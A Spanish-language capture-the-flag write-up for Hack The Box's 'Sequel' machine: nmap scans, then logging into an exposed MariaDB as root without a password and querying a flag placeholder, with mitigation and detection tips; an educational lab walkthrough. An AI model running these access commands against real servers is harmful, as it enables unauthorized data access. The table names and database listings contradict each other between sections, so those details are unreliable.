---
machine: Sequel
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
tags: [linux, mysql, no-auth, database]
---

# Sequel — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available (Starting Point), publicable.
> Ficha de referencia. Sin flags ni credenciales reales.

## TL;DR

**MariaDB/MySQL en 3306 con `root` sin contraseña**. Se conecta uno con el cliente, lista las bases de datos, entra en la del reto y lee la tabla con la flag. Otro servicio mal configurado, sin exploit.

## Reconocimiento

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

```text
22/tcp    ssh    OpenSSH
3306/tcp  mysql  MariaDB 10.3.27
```

```bash
nmap -p3306 --script mysql-info,mysql-empty-password <IP>
```

## Enumeración

- **22/tcp** (SSH) y **3306/tcp** (`MariaDB 10.3.27`). El 3306 responde sin pedir credenciales: `nmap -p3306 --script mysql-info,mysql-empty-password` confirma que `root` entra sin contraseña.
- `mysql -h <IP> -u root` abre sesión directamente; `show databases;` lista `information_schema`, `mysql`, `performance_schema`, `sys` y **`htb`**.
- En `htb`, `show tables;` devuelve `users`; `select * from users;` muestra los usuarios y la flag en una de las filas.

## Foothold

```bash
mysql -h <IP> -u root
```

```sql
show databases;
```

```text
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

```sql
use htb;
show tables;
select * from config;
```

```text
+----+----------------------------------+
| id | value                            |
+----+----------------------------------+
|  1 | <flag>                           |
+----+----------------------------------+
```

Si `root` tuviera contraseña, el siguiente paso sería probar credenciales por defecto o vacías en otros usuarios y, con `FILE`, leer ficheros del sistema.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

- No aplica: el acceso ya es `root` del SGBD y basta leer la base; no hay shell de sistema que escalar.

## Evidencia

```text
htb.config.value  ->  <flag>
```

## Lecciones aprendidas

- Un motor de base de datos expuesto con `root` sin contraseña es lectura total del servidor de datos.
- `bind-address = 0.0.0.0` en 3306 saca la base de datos a la red sin necesidad de vulnerabilidad.
- Mitigación: `bind-address = 127.0.0.1`, `root@localhost` con contraseña fuerte, usuarios por aplicación y firewall.
- Detección: conexiones al 3306 desde fuera del segmento de aplicación y logins correctos con `root` desde IPs nuevas.

## Mitigaciones y detección

- `mysql_secure_installation` (contraseña para `root`, usuarios nominales por base, `bind-address` a loopback). Detección: conexiones al 3306 sin TLS desde hosts que no son de aplicación y `SELECT` sobre `mysql.user`.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.

## Referencias

- Documentación de la plataforma y del servicio afectado.
